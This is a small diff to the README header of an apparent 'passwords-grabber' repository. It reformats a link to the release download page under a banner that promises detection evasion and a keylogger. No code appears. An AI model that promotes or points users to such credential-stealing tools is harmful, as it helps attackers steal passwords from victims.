@@ -3,13 +3,11 @@
 <h1 align="center">
 ⚔️ UPDATE FIX DETECT + KEYLOGGER AT 150 STARS ⭐
 </h1>
+<br>
 
-<h1 align="center">
-  Download: [Release page](https://github.com/ramasii/passwords-grabber/releases)
-  <br>
-  <br>
-</h1>
+# Download: [Release page](https://github.com/ramasii/passwords-grabber/releases)
 
+<br>
 
 ## 🌐 〢 Content
 
